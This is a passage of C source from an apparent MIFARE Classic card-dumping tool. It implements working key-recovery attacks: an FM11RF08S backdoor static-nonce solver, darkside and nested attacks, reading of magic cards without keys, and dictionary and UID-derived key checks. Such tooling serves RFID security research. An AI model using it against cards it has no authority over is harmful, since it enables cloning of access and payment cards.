		if (!r && (r = gen2AckTest()) < 0) return -1;
		if (r) m->flags |= MF_MAGIC_GEN2;
	}
	return m->flags;
}

int mfFirstBlock(int sector)
{
	return sector < 32 ? sector * 4 : 128 + (sector - 32) * 16;
}

int mfSectorBlocks(int sector)
{
	return sector < 32 ? 4 : 16;
}

// Runs one auth (+ reads) attempt, reloading the monitor after chip stalls.
static int authRetry(u8 block, const u8 key[6], bool keyB, Crypto1 *c)
{
	for (int t = 0; t < 4; t++) {
		int r = mfAuth(block, key, keyB, c);
		if (r >= 0) return r;
		logp("  (stall in auth: %s; reloading)\n", why);
		if (!iso14aStart()) return -1;
	}
	return -1;
}

static int sectorValid(const MfDump *d, int sec)
{
	int b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec), have = 0;
	for (int i = 0; i < nb; i++) have += d->valid[b0 + i];
	return have;
}

MfDumpProgress mfProg;

static void progSector(const MfDump *d, int sec)
{
	for (int kb = 0; kb < 2; kb++)
		if (d->keyFound[sec][kb]) mfProg.key[sec][kb] = MF_KEY_FOUND;
	mfProg.blocks[sec] = sectorValid(d, sec);
}

// Auth a sector with the given key/type, record it, and read every block not read yet.
// 1 = key authed (recorded), 0 = refused, -1 = monitor stall we couldn't recover from.
static int readSector(MfDump *d, int sec, const u8 key[6], bool kb)
{
	int b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec);
	Crypto1 c;
	int r = authRetry(b0, key, kb, &c);
	if (r < 0) return -1;
	if (!r) return 0;
	memcpy(d->keys[sec][kb], key, 6);
	d->keyFound[sec][kb] = true;
	for (int i = 0; i < nb; i++) {
		if (d->valid[b0 + i]) continue;
		r = mfReadBlock(&c, b0 + i, d->data[b0 + i]);
		if (r < 0) { // stall: re-auth and go on with the next block
			if (!iso14aStart() || authRetry(b0, key, kb, &c) <= 0) break;
			r = mfReadBlock(&c, b0 + i, d->data[b0 + i]);
		}
		if (r > 0) d->valid[b0 + i] = true;
	}
	progSector(d, sec);
	return 1;
}

static int addKey(u8 (*out)[6], int n, int max, const u8 *key);

// readSector for a key that already fits offline: a refusal is the static-nonce card's cold-auth flake
static int readSectorRetry(MfDump *d, int sec, const u8 key[6], bool kb)
{
	for (int t = 0; t < 3; t++) {
		int r = readSector(d, sec, key, kb);
		if (r) return r;
	}
	return 0;
}

// FM11RF08S: the static nonces of key A and key B of a sector both come from one 16-bit seed, which
// each key's nonce gives back (pm3 tools/mfc/card_only/staticnested_2x1nt_rf08s*.c, eprint 2024/1275).
// So a sector's known key filters the other key's candidates down to a handful.
static u16 prev8Lfsr16[1 << 16], prev14Lfsr16[1 << 16];

static void seedTables(void)
{
	static bool init;
	if (init) return;
	u16 buf[16] = { 0 }, x = 1;
	for (u32 i = 0; i < 65536 + 16; ++i) {
		prev8Lfsr16[buf[(i + 8) % 16]] = buf[i % 16];
		prev14Lfsr16[buf[(i + 14) % 16]] = buf[i % 16];
		x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
		buf[i % 16] = (x & 0xFF) << 8 | x >> 8;
	}
	init = true;
}

static u16 staticSeed(u32 nt, u64 key)
{
	static const u8 a[] = { 0, 8, 9, 4, 6, 11, 1, 15, 12, 5, 2, 13, 10, 14, 3, 7 };
	static const u8 b[] = { 0, 13, 1, 14, 4, 10, 15, 7, 5, 3, 8, 6, 9, 2, 12, 11 };
	u16 n = prev14Lfsr16[nt >> 16];
	for (int i = 0, odd = 1; i < 48; i += 8, odd ^= 1) {
		u8 lo = key >> i & 0xF, hi = key >> (i + 4) & 0xF;
		n ^= odd ? a[lo] | b[hi] << 4 : b[lo] | a[hi] << 4;
		n = prev8Lfsr16[n];
	}
	return n;
}

// A cell's key candidates (crapto1_static, ~20 s on the 3DS), computed once per staticPass.
static u64 *candCache[40][2];
static int candN[40][2];

static void candFree(void)
{
	for (int i = 0; i < 80; i++) {
		free(candCache[i / 2][i % 2]);
		candCache[i / 2][i % 2] = NULL;
	}
}

static int cellCands(u32 uid, const MfStatic *s, int sec, int kb, const u64 **out)
{
	static u64 tmp[1 << 18];
	if (!candCache[sec][kb]) {
		int n = crapto1_static(uid, s->nt, s->ntEnc, s->par, tmp, 1 << 18);
		u64 *p = mfCancel ? NULL : malloc(8 * (n + 1)); // a cancelled list is partial: not kept
		*out = tmp;
		if (!p) return n;
		memcpy(p, tmp, 8 * n);
		candCache[sec][kb] = p, candN[sec][kb] = n;
	}
	*out = candCache[sec][kb];
	return candN[sec][kb];
}

static u8 pm3Keys[MF_PM3_MAX][6]; // MF_PM3_KEYS without the running dictionary's keys (mfDumpCard)
static int npm3;

// FM11RF08S family (NOTES.md): with a backdoor key, collect every sector's static nonce and solve
// keys offline -- dictionary keys and reuse are checked against the nonces with no RF traffic, and
// only matches cost an auth. A candidate of one cell that fits another cell is a reused key. Keys used
// by a single cell stay open (tens of thousands of candidates: too many to try over RF). Returns -1
// on a monitor error.
static int staticPass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict)
{
	int open = 0;
	for (int sec = 0; sec < sectors; sec++) open += !d->keyFound[sec][0] + !d->keyFound[sec][1];
	if (!open) return 0; // the UID's keys did it
	u8 bd[6];
	int r = mfBackdoorKey(bd);
	if (r <= 0) return r;
	logp("backdoor key %02X%02X%02X%02X%02X%02X: static nonce attack\n",
		bd[0], bd[1], bd[2], bd[3], bd[4], bd[5]);
	static MfStatic st[40][2];
	static u64 cand[1 << 18];
	const u64 *cl;
	candFree();
	bool done[40][2] = { 0 }, expanded[40][2] = { 0 }, pm3Seen[40][2] = { 0 };
	u32 uid = cardUid();
	progOp("Static nonces (backdoor)");
	for (int sec = 0; sec < sectors && !mfCancel; sec++)
		for (int kb = 0; kb < 2; kb++) {
			progStep(2 * sec + kb, 2 * sectors);
			// a found key's nonce still seeds the other key of its sector (the seed filter below)
			if (d->keyFound[sec][kb] && d->keyFound[sec][!kb]) continue;
			if ((r = mfStaticNonce(mfFirstBlock(sec), kb, bd, &st[sec][kb])) < 0) return -1;
			done[sec][kb] = r == 1;
		}
#define OPEN(s, k) (done[s][k] && !d->keyFound[s][k])
	bool progress = true;
	while (progress && !mfCancel) {
		progress = false;
		progOp("Static nonce: reading with the keys that fit");
		for (int sec = 0; sec < sectors && !mfCancel; sec++, progStep(sec, sectors))
			for (int kb = 0; kb < 2; kb++) {
				for (int k = 0; k < *ndict && OPEN(sec, kb); k++)
					if (mfStaticMatch(&st[sec][kb], dict[k]) && readSectorRetry(d, sec, dict[k], kb) < 0)
						return -1;
				// pm3's big dictionary costs nothing here: offline, once per cell
				for (int k = 0; k < npm3 && OPEN(sec, kb) && !pm3Seen[sec][kb]; k++)
					if (mfStaticMatch(&st[sec][kb], pm3Keys[k])) {
						*ndict = addKey(dict, *ndict, MF_MAX_KEYS, pm3Keys[k]);
						if (readSectorRetry(d, sec, pm3Keys[k], kb) < 0) return -1;
					}
				pm3Seen[sec][kb] = true;
			}
		for (int sec = 0; sec < sectors && !progress && !mfCancel; sec++)
			for (int kb = 0; kb < 2 && !progress; kb++) {
				if (!OPEN(sec, kb) || expanded[sec][kb]) continue;
				expanded[sec][kb] = true;
				// Its candidates only matter where they fit another open cell: none left, no solve.
				int others = 0;
				for (int c = 0; c < 2 * sectors; c++) others += OPEN(c / 2, c % 2);
				if (others < 2) continue;
				MfStatic *s = &st[sec][kb];
				progOp("Static nonce: sector %d key %c candidates", sec, kb ? 'B' : 'A');
				mfProg.key[sec][kb] = MF_KEY_TRYING;
				crapto1_tick = solveTick;
				int n = cellCands(uid, s, sec, kb, &cl);
				if (mfCancel) break;
				if (!d->keyFound[sec][kb]) mfProg.key[sec][kb] = MF_KEY_OPEN;
				logp("sector %2d %c: %d candidates\n", sec, kb ? 'B' : 'A', n);
				progOp("Static nonce: sector %d key %c, checking for reuse", sec, kb ? 'B' : 'A');
				for (int i = 0; i < n && !progress && !mfCancel; i++) {
					if (!(i & 1023)) solveTick(1000LL * i / n); // ~2 s of decrypts: the bar, B, UI frames
					for (int os = 0; os < sectors && !progress; os++)
						for (int ok = 0; ok < 2; ok++) {
							if ((os == sec && ok == kb) || !OPEN(os, ok)) continue;
							if (crapto1_nt_decrypt(cl[i], uid, st[os][ok].ntEnc) != st[os][ok].nt)
								continue;
							u8 key[6];
							keyBytes(cl[i], key);
							logp("  reused key %02X%02X%02X%02X%02X%02X (sector %d %c)\n", key[0], key[1],
								key[2], key[3], key[4], key[5], os, ok ? 'B' : 'A');
							*ndict = addKey(dict, *ndict, MF_MAX_KEYS, key);
							progress = true; // back to the dictionary step, which applies it everywhere
							break;
						}
				}
			}
	}
	seedTables();
	// Both keys of a sector used only there: pair the two candidate lists by seed (keeps about half of
	// each), then auth key A's that pair up, one by one (pm3 fchk's them the same way); key B follows
	// from the seed filter below. Two passes: a right key can be refused once (cold-auth flake).
	static u8 seen[1 << 13];
	for (int sec = 0; sec < sectors && !mfCancel; sec++) {
		MfStatic *a = &st[sec][0], *b = &st[sec][1];
		if (!OPEN(sec, 0) || !OPEN(sec, 1) || a->nt == b->nt) continue;
		progOp("Static nonce: sector %d, both keys", sec);
		mfProg.key[sec][0] = mfProg.key[sec][1] = MF_KEY_TRYING;
		crapto1_tick = solveTick;
		const u64 *cb;
		int m = cellCands(uid, b, sec, 1, &cb);
		memset(seen, 0, sizeof(seen));
		for (int j = 0; j < m && !mfCancel; j++) {
			u16 sd = staticSeed(b->nt, cb[j]);
			seen[sd >> 3] |= 1 << (sd & 7);
		}
		int n = mfCancel ? 0 : cellCands(uid, a, sec, 0, &cl), k = 0;
		for (int i = 0; i < n; i++) {
			u16 sd = staticSeed(a->nt, cl[i]);
			if (seen[sd >> 3] >> (sd & 7) & 1) cand[k++] = cl[i];
		}
		logp("sector %2d: %d A + %d B candidates, %d A keys pair up: trying them\n", sec, n, m, k);
		u64 t0 = osGetTime();
		for (int pass = 0; pass < 2 && OPEN(sec, 0) && !mfCancel; pass++) {
			progOp("Static nonce: sector %d key A, %d to try%s", sec, k, pass ? " (again)" : "");
			u64 tb = osGetTime();
			for (int i = 0; i < k && OPEN(sec, 0) && !mfCancel; i += 64) {
				progStep(i, k);
				if (i && !(i & 1023)) logp("  %d tried, %lu/s\n", i, (u32)(1000ULL * i / (osGetTime() - tb)));
				u8 keys[64][6];
				int m = k - i < 64 ? k - i : 64;
				for (int j = 0; j < m; j++) keyBytes(cand[i + j], keys[j]);
				int h = mfChkKeys(mfFirstBlock(sec), false, keys, m);
				if (h == -3) return -1;
				if (h == -2 && !iso14aStart()) return -1; // card lost: once more after a reactivation
				if (h == -2) h = mfChkKeys(mfFirstBlock(sec), false, keys, m);
				if (h < -1) return -1;
				if (h >= 0 && readSectorRetry(d, sec, keys[h], false) < 0) return -1;
			}
		}
		logp("sector %2d A: %s after %lu s\n", sec, OPEN(sec, 0) ? "not found" : "found", (u32)((osGetTime() - t0) / 1000));
		for (int kb = 0; kb < 2; kb++)
			if (!d->keyFound[sec][kb]) mfProg.key[sec][kb] = MF_KEY_OPEN;
	}
	// A key used only here whose sector's other key is known: the seed filter, then auths.
	for (int sec = 0; sec < sectors && !mfCancel; sec++)
		for (int kb = 0; kb < 2; kb++) {
			MfStatic *s = &st[sec][kb], *o = &st[sec][!kb];
			if (!OPEN(sec, kb) || !d->keyFound[sec][!kb] || !done[sec][!kb] || s->nt == o->nt) continue;
			progOp("Static nonce: sector %d key %c from key %c", sec, kb ? 'B' : 'A', kb ? 'A' : 'B');
			mfProg.key[sec][kb] = MF_KEY_TRYING;
			crapto1_tick = solveTick;
			int n = cellCands(uid, s, sec, kb, &cl);
			u16 seed = staticSeed(o->nt, key48(d->keys[sec][!kb]));
			int fit = 0;
			for (int i = 0; i < n && OPEN(sec, kb) && !mfCancel; i++) {
				if (staticSeed(s->nt, cl[i]) != seed) continue;
				u8 key[6];
				keyBytes(cl[i], key);
				fit++;
				if ((r = readSectorRetry(d, sec, key, kb)) < 0) return -1;
			}
			logp("sector %2d %c: %d candidates, %d fit key %c's seed%s\n", sec, kb ? 'B' : 'A', n, fit, kb ? 'A' : 'B',
				OPEN(sec, kb) ? "" : ": found");
			if (!d->keyFound[sec][kb]) mfProg.key[sec][kb] = MF_KEY_OPEN;
		}
	candFree();
	if (mfCancel) return 1; // stopped: nothing is known to be unrecoverable, and no slow backdoor reads
	for (int sec = 0; sec < sectors; sec++)
		for (int kb = 0; kb < 2; kb++)
			if (OPEN(sec, kb)) {
				logp("sector %2d %c: key used only here, not recovered\n", sec, kb ? 'B' : 'A');
				mfProg.key[sec][kb] = MF_KEY_FAILED;
			}
#undef OPEN
	// The backdoor also reads data: fill in blocks no recovered key could read.
	for (int sec = 0; sec < sectors; sec++) {
		int b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec);
		if (sectorValid(d, sec) == nb) continue;
		Crypto1 c;
		r = 0;
		for (int t = 0; t < 3 && !r; t++)
			if ((r = authCmd(0x64, b0, bd, &c, NULL)) < 0) return -1;
		for (int i = 0; r && i < nb; i++)
			if (!d->valid[b0 + i] && mfReadBlock(&c, b0 + i, d->data[b0 + i]) > 0) d->valid[b0 + i] = true;
		progSector(d, sec);
	}
	return 1;
}

// Keys from the UID (pm3 `hf mf keygen`): one on-chip check per sector / key type, before the
// dictionary and the attacks. The KDF that opened the most sectors names the card.
static int kdfPass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict)
{
	int hits[16] = { 0 }, best = 0;
	progOp("Keys from the UID");
	for (int sec = 0; sec < sectors && !mfCancel; sec++)
		for (int kb = 0; kb < 2; kb++) {
			if (d->keyFound[sec][kb]) continue;
			u8 keys[MFC_KDF_MAX][6];
			const char *names[MFC_KDF_MAX];
			int n = mfcKdfKeys(card.uid, card.uidLen, sec, kb, keys, names);
			if (!n) continue;
			progStep(2 * sec + kb, 2 * sectors);
			int h = mfChkKeys(mfFirstBlock(sec), kb, (const u8 (*)[6])keys, n);
			if (h == -3) return -1;
			for (int j = h == -2 ? 0 : h; j >= 0 && j < n && !d->keyFound[sec][kb]; j++) {
				if (readSectorRetry(d, sec, keys[j], kb) < 0) return -1;
				if (d->keyFound[sec][kb]) {
					*ndict = addKey(dict, *ndict, MF_MAX_KEYS, keys[j]);
					for (int i = 0; i < mfcNumKdfs; i++)
						if (mfcKdfName(i) == names[j]) hits[i]++;
				}
				if (h != -2) break;
			}
		}
	for (int i = 1; i < mfcNumKdfs; i++)
		if (hits[i] > hits[best]) best = i;
	if (hits[best]) {
		d->kdf = mfcKdfName(best);
		logp("keys from the UID: %s (%d)\n", d->kdf, hits[best]);
	}
	return 0;
}

// Magic cards read without keys: Gen4 GTU (default password), then the Gen1a backdoor. The trailers
// hold the real keys; they go into the dictionary, which the sweep then confirms by auth.
static int magicPass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict)
{
	int nb = mfFirstBlock(sectors), r = mfGen4Read(mfGen4Pwd, 0, d->data[0]);
	if (r < 0) return -1;
	bool gen4 = r;
	if (!gen4 && !mfGen1aUnlock()) return 0;
	logp("%s magic: reading without keys\n", gen4 ? "gen4 GTU" : "gen1a");
	progOp("Reading without keys (%s)", gen4 ? "Gen4 GTU" : "Gen1a");
	for (int b = 0; b < nb && !mfCancel; b++) {
		progStep(b, nb);
		for (int t = 0; t < 3; t++) {
			if (gen4) {
				if ((r = mfGen4Read(mfGen4Pwd, b, d->data[b])) < 0) return -1;
			} else {
				r = gen1aRead(b, d->data[b]); // -1 is no answer here, not a monitor error
				if (r != 1) mfGen1aUnlock();
			}
			if (r == 1) break;
		}
		d->valid[b] = r == 1;
		if (d->valid[b]) mfProg.blocks[b < 128 ? b / 4 : 32 + (b - 128) / 16]++;
	}
	progOp("Checking the trailer keys");
	// The trailer keys are known to be right: confirm them with retries, so one flaky auth doesn't
	// send a sector to the nested attack.
	for (int sec = 0; sec < sectors; sec++) {
		int t = mfFirstBlock(sec) + mfSectorBlocks(sec) - 1;
		if (!d->valid[t]) continue;
		u8 keys[2][6];
		memcpy(keys[0], d->data[t], 6);
		memcpy(keys[1], d->data[t] + 10, 6);
		progStep(sec, sectors);
		for (int kb = 0; kb < 2; kb++) {
			*ndict = addKey(dict, *ndict, MF_MAX_KEYS, keys[kb]);
			if (readSectorRetry(d, sec, keys[kb], kb) < 0) return -1;
		}
	}
	return 1;
}

// The dictionary's state across passes: entries already tried per cell (so each is tried once), and
// for the bar's ETA, the auths done and the time they took.
typedef struct {
	int tried[40][2];
	u32 done, ms;
} DictState;

// The dictionary on one open cell: 32 keys per on-chip check (mfChkKeys, ~150 keys/s), then the hit
// read the normal way; a card that doesn't answer the chip's own select gets them one by one.
// The bar counts the auths still to try in this pass. -1 = monitor error.
static int dictCell(MfDump *d, int sectors, int sec, int kb, const u8 (*dict)[6], int ndict, DictState *ds)
{
	u32 left = 0;
	for (int c = 2 * sec + kb; c < 2 * sectors; c++)
		if (!d->keyFound[c / 2][c % 2]) left += ndict - ds->tried[c / 2][c % 2];
	mfProg.key[sec][kb] = MF_KEY_TRYING;
	if (ds->tried[sec][kb] < ndict) progOp("Dictionary: sector %d key %c", sec, kb ? 'B' : 'A');
	for (int k = ds->tried[sec][kb]; k < ndict && !d->keyFound[sec][kb] && !mfCancel;) {
		progEta(ds->done, ds->done + left, left * (ds->done ? ds->ms / ds->done : 60));
		int m = ndict - k < 32 ? ndict - k : 32, done = m;
		u64 t0 = osGetTime();
		int h = mfChkKeys(mfFirstBlock(sec), kb, dict + k, m);
		if (h == -3) return -1;
		if (h >= 0) {
			if (readSector(d, sec, dict[k + h], kb) < 0) return -1;
			if (!d->keyFound[sec][kb]) done = h + 1; // the chip's hit didn't read: go on after it
		} else if (h == -2) {
			for (int j = 0; j < m && !d->keyFound[sec][kb]; j++)
				if (readSector(d, sec, dict[k + j], kb) < 0) return -1;
		}
		ds->ms += osGetTime() - t0;
		ds->done += done, left -= done, k += done;
	}
	ds->tried[sec][kb] = ndict;
	return 0;
}

// The dictionary alone on every open cell, each key found folded back in, until a pass finds nothing
// new. Cheap with mfChkKeys, so it goes before the attacks. -1 = monitor error.
static int dictPass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict, DictState *ds)
{
	bool progress = true;
	while (progress && !mfCancel) {
		progress = false;
		for (int sec = 0; sec < sectors && !mfCancel; sec++)
			for (int kb = 0; kb < 2; kb++) {
				if (d->keyFound[sec][kb]) continue;
				if (dictCell(d, sectors, sec, kb, (const u8 (*)[6])dict, *ndict, ds) < 0) return -1;
				if (!d->keyFound[sec][kb]) {
					mfProg.key[sec][kb] = MF_KEY_OPEN;
					continue;
				}
				*ndict = addKey(dict, *ndict, MF_MAX_KEYS, d->keys[sec][kb]);
				progress = true;
			}
	}
	return 0;
}

// pm3's big dictionary on the open cells: all of them, or until the first hit (first). Each key found
// joins the running dictionary. -> keys found, -1 = monitor error.
static int pm3Pass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict, DictState *ds, bool first)
{
	int found = 0;
	for (int sec = 0; sec < sectors && !mfCancel && !(first && found); sec++)
		for (int kb = 0; kb < 2 && !(first && found); kb++) {
			if (d->keyFound[sec][kb]) continue;
			if (dictCell(d, sectors, sec, kb, (const u8 (*)[6])pm3Keys, npm3, ds) < 0) return -1;
			if (!d->keyFound[sec][kb]) {
				mfProg.key[sec][kb] = MF_KEY_OPEN;
				continue;
			}
			*ndict = addKey(dict, *ndict, MF_MAX_KEYS, d->keys[sec][kb]);
			found++;
		}
	return found;
}

static int hexNibble(char c);

// MF_PM3_KEYS into pm3Keys, minus the n keys of dict.
static int loadPm3(const u8 (*dict)[6], int n)
{
	npm3 = 0;
	FILE *f = fopen(MF_PM3_KEYS, "r");
	if (!f) return 0;
	char line[160];
	while (npm3 < MF_PM3_MAX && fgets(line, sizeof(line), f)) {
		u8 *key = pm3Keys[npm3];
		int d = 0;
		for (; d < 12 && hexNibble(line[d]) >= 0; d++)
			key[d / 2] = (d & 1) ? (key[d / 2] | hexNibble(line[d])) : hexNibble(line[d]) << 4;
		if (d < 12 || hexNibble(line[12]) >= 0) continue;
		bool dup = false;
		for (int i = 0; i < n && !dup; i++) dup = !memcmp(dict[i], key, 6);
		if (!dup) npm3++;
	}
	fclose(f);
	logp("%s: %d more keys\n", MF_PM3_KEYS, npm3);
	return npm3;
}

int mfDumpCard(MfDump *d, int sectors, const u8 (*keys)[6], int nkeys)
{
	memset(d, 0, sizeof(*d));
	d->sectors = sectors;
	memset(&mfProg, 0, sizeof(mfProg));
	mfProg.sectors = sectors;
	// Running dictionary: the supplied keys plus every key we recover (a key reused by
	// another sector is far cheaper to auth than to recover again). Magic cards' trailer keys go first.
	static u8 dict[MF_MAX_KEYS][6];
	static DictState ds;
	memset(&ds, 0, sizeof(ds));
	int ndict = 0;
	if (magicPass(d, sectors, dict, &ndict) < 0) return -1;
	if (kdfPass(d, sectors, dict, &ndict) < 0) return -1;
	for (int k = 0; k < nkeys; k++) ndict = addKey(dict, ndict, MF_MAX_KEYS, keys[k]);
	loadPm3((const u8 (*)[6])dict, ndict);
	static DictState pds; // pm3's dictionary
	memset(&pds, 0, sizeof(pds));
	bool nestedTried[40][2] = { 0 };

	// The dictionary first, whatever the card; then the FM11RF08S family's backdoor solves what it can.
	if (dictPass(d, sectors, dict, &ndict, &ds) < 0) return -1;
	if (staticPass(d, sectors, dict, &ndict) < 0) return -1;

	// First confirmed key, used as the nested known key.
	int pivotSec = -1; bool pivotB = false;
	for (int c = 0; c < 2 * sectors && pivotSec < 0; c++)
		if (d->keyFound[c / 2][c % 2]) pivotSec = c / 2, pivotB = c % 2, mfProg.pivot = true;

	// No key at all: darkside (cards with the NACK bug) for one, as the nested pivot.
	if (pivotSec < 0 && !mfCancel) {
		u8 rk[6];
		logp("sector  0 A: darkside...\n");
		mfProg.key[0][0] = MF_KEY_TRYING;
		int r = mfDarkside(mfFirstBlock(0), false, rk);
		if (r < 0) return -1;
		mfProg.key[0][0] = MF_KEY_OPEN;
		if (!r) logp("  darkside: %s\n", mfWhy());
		else {
			logp("  recovered %02X%02X%02X%02X%02X%02X\n", rk[0], rk[1], rk[2], rk[3], rk[4], rk[5]);
			if (readSector(d, 0, rk, false) < 0) return -1;
			if (d->keyFound[0][0]) {
				pivotSec = 0, pivotB = false, mfProg.pivot = true;
				ndict = addKey(dict, ndict, MF_MAX_KEYS, d->keys[0][0]);
			}
		}
	}

	// Still none: pm3's big dictionary until a cell opens, as the pivot.
	if (pivotSec < 0 && npm3 && !mfCancel) {
		if (pm3Pass(d, sectors, dict, &ndict, &pds, true) < 0) return -1;
		for (int c = 0; c < 2 * sectors && pivotSec < 0; c++)
			if (d->keyFound[c / 2][c % 2]) pivotSec = c / 2, pivotB = c % 2, mfProg.pivot = true;
	}

	// Sweep until a full pass turns up nothing new: recover EVERY missing A/B key, folding each
	// one back into the dictionary so later sectors can reuse it before falling back to nested.
	// Then pm3's big dictionary on what the attacks left open, and if it found any, sweep again.
	for (bool progress = true; progress && !mfCancel;) {
		progress = false;
		for (int sec = 0; sec < sectors && !mfCancel; sec++)
			for (int kb = 0; kb < 2; kb++) {
				if (d->keyFound[sec][kb]) continue;
				if (dictCell(d, sectors, sec, kb, (const u8 (*)[6])dict, ndict, &ds) < 0) return -1;
				if (!d->keyFound[sec][kb]) {
					mfProg.key[sec][kb] = nestedTried[sec][kb] ? MF_KEY_FAILED : MF_KEY_OPEN;
					if (pivotSec < 0 || nestedTried[sec][kb] || mfCancel) continue; // nested needs a known key
					nestedTried[sec][kb] = true;
					u8 rk[6];
					logp("sector %2d %c: nested...\n", sec, kb ? 'B' : 'A');
					mfProg.key[sec][kb] = MF_KEY_TRYING;
					progOp("Nested attack: sector %d key %c", sec, kb ? 'B' : 'A');
					u64 t0 = osGetTime();
					int r = mfNestedRecover(mfFirstBlock(pivotSec), d->keys[pivotSec][pivotB],
						pivotB, mfFirstBlock(sec), kb, rk);
					if (r < 0) return -1;
					if (!mfCancel) {
						mfProg.nestedMs += osGetTime() - t0;
						mfProg.nestedRuns++;
					}
					if (!r) {
						logp("  nested: %s\n", mfWhy());
						mfProg.key[sec][kb] = mfCancel ? MF_KEY_OPEN : MF_KEY_FAILED;
						continue;
					}
					logp("  recovered %02X%02X%02X%02X%02X%02X\n",
						rk[0], rk[1], rk[2], rk[3], rk[4], rk[5]);
					if (readSector(d, sec, rk, kb) < 0) return -1;
				}
				if (d->keyFound[sec][kb]) {
					if (pivotSec < 0) { pivotSec = sec; pivotB = kb; mfProg.pivot = true; }
					ndict = addKey(dict, ndict, MF_MAX_KEYS, d->keys[sec][kb]);
					progress = true;
				}
			}
		if (!progress && npm3 && !mfCancel) {
			int r = pm3Pass(d, sectors, dict, &ndict, &pds, false);
			if (r < 0) return -1;
			progress = r > 0;
		}
	}
	if (mfCancel) logp("cancelled\n");
	if (sectors == 16 && !mfCancel) { // MFC EV1's signature sector 17 (a 4K's block 69 is user memory)
		progOp("Originality signature");
		int r = mfReadSignature(d->sig);
		if (r < 0) return -1;
		if (r) {
			d->sigUidLen = card.uidLen;
			logp("signature read\n");
		}
	}
	for (int sec = 0; sec < sectors && !mfCancel; sec++)
		for (int kb = 0; kb < 2; kb++)
			if (!d->keyFound[sec][kb]) mfProg.key[sec][kb] = MF_KEY_FAILED;
	// Fill trailer keys we know, tally, and log.
	int total = 0;
	for (int sec = 0; sec < sectors; sec++) {
		int b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec), have = sectorValid(d, sec);
		int t = b0 + nb - 1;
		if (d->valid[t]) { // keys read back as zeros (or not at all); fill in what we know
			if (d->keyFound[sec][0]) memcpy(d->data[t], d->keys[sec][0], 6);
			if (d->keyFound[sec][1]) memcpy(d->data[t] + 10, d->keys[sec][1], 6);
		}
		total += have;
		logp("sector %2d: %d/%d blocks, A %s B %s\n", sec, have, nb,
			d->keyFound[sec][0] ? "ok" : "--", d->keyFound[sec][1] ? "ok" : "--");
	}
	return total;
}

int mfSectorsFromSak(u8 sak)
{
	switch (sak & 0x19) {
	case 0x09: return 5;  // Mini
	case 0x18: return 40; // 4K
	case 0x19: return 32; // 2K
	default: return 16;   // 1K
	}
}

static int addKey(u8 (*out)[6], int n, int max, const u8 *key)
{
	for (int i = 0; i < n; i++)
		if (!memcmp(out[i], key, 6)) return n;
	if (n < max) memcpy(out[n++], key, 6);
	return n;
}

static int hexNibble(char c)
{
	return (c >= '0' && c <= '9') ? c - '0' : ((c | 0x20) >= 'a' && (c | 0x20) <= 'f') ? (c | 0x20) - 'a' + 10 : -1;
}

int mfKeyList(u8 (*out)[6], int max, const u8 (*extra)[6], int nextra)
{
	int n = 0;
	for (int i = 0; i < nextra; i++) n = addKey(out, n, max, extra[i]);
	FILE *f = fopen(MF_KEYS, "r");
	if (f) {
		char line[64];
		while (fgets(line, sizeof(line), f)) {
			u8 key[6];
			int d = 0;
			for (char *p = line; *p && *p != '#' && d < 12; p++) {
				int v = hexNibble(*p);
				if (v < 0) continue;
				key[d / 2] = (d & 1) ? (key[d / 2] | v) : v << 4;
				d++;
			}
			if (d == 12) n = addKey(out, n, max, key);
		}
		fclose(f);
	}
	for (int i = 0; i < mfNumDefaultKeys; i++) n = addKey(out, n, max, mfDefaultKeys[i]);
	return n;
}

bool mfWriteDump(const MfDump *d, const char *path)
{
	FILE *f = fopen(path, "wb");
	if (!f) return false;
	static const u8 zero[16];
	int nb = mfFirstBlock(d->sectors);
	bool ok = true;
	for (int b = 0; b < nb; b++) ok &= fwrite(d->valid[b] ? d->data[b] : zero, 1, 16, f) == 16; // unread = zeros
	ok &= !fclose(f);
	char kpath[300];
	snprintf(kpath, sizeof(kpath), "%.*s.keys.txt", (int)(strlen(path) - 4), path);
	if (!ok || !(f = fopen(kpath, "w"))) return false;
	for (int s = 0; s < d->sectors; s++) {
		fprintf(f, "%2d", s);
		for (int k = 0; k < 2; k++) {
			fprintf(f, " %c ", "AB"[k]);
			for (int i = 0; i < 6; i++)
				if (d->keyFound[s][k]) fprintf(f, "%02X", d->keys[s][k][i]);
				else fprintf(f, "--");
		}
		fprintf(f, "\n");
	}
	bool any = false;
	for (int b = 0; b < nb; b++)
		if (!d->valid[b]) fprintf(f, "%s %d", any ? "" : "# unread:", b), any = true;
	if (any) fprintf(f, "\n");
	if (d->sigUidLen) {
		fprintf(f, "# signature %d ", d->sigUidLen);
		for (int i = 0; i < 32; i++) fprintf(f, "%02X", d->sig[i]);
		fprintf(f, "\n");
	}
	return !fclose(f);
}

bool mfLoadDump(MfDump *d, const char *path)
{
	memset(d, 0, sizeof(*d));
	FILE *f = fopen(path, "rb");
	if (!f) return false;
	int n = fread(d->data, 16, MF_MAX_BLOCKS, f);
	fclose(f);
	while (d->sectors < 40 && mfFirstBlock(d->sectors) < n) d->sectors++;
	if (!n || mfFirstBlock(d->sectors) != n) return false;
	for (int b = 0; b < n; b++) d->valid[b] = true;
	char kpath[300], line[300];
	snprintf(kpath, sizeof(kpath), "%.*s.keys.txt", (int)(strlen(path) - 4), path);
	if (!(f = fopen(kpath, "r"))) { // no key file (a foreign dump): the trailers hold the keys
		for (int s = 0; s < d->sectors; s++) {
			const u8 *t = d->data[mfFirstBlock(s) + mfSectorBlocks(s) - 1];
			memcpy(d->keys[s][0], t, 6);
			memcpy(d->keys[s][1], t + 10, 6);
			d->keyFound[s][0] = d->keyFound[s][1] = true;
		}
		return true;
	}
	while (fgets(line, sizeof(line), f)) {
		int s, pos;
		if (!strncmp(line, "# unread:", 9)) {
			for (char *p = line + 9; sscanf(p, "%d%n", &s, &pos) == 1; p += pos)
				if (s >= 0 && s < n) d->valid[s] = false;
			continue;
		}
		char hex[80];
		if (sscanf(line, "# signature %d %79s", &s, hex) == 2 && (s == 4 || s == 7) && strlen(hex) == 64) {
			for (int i = 0; i < 64; i++) {
				int v = hexNibble(hex[i]);
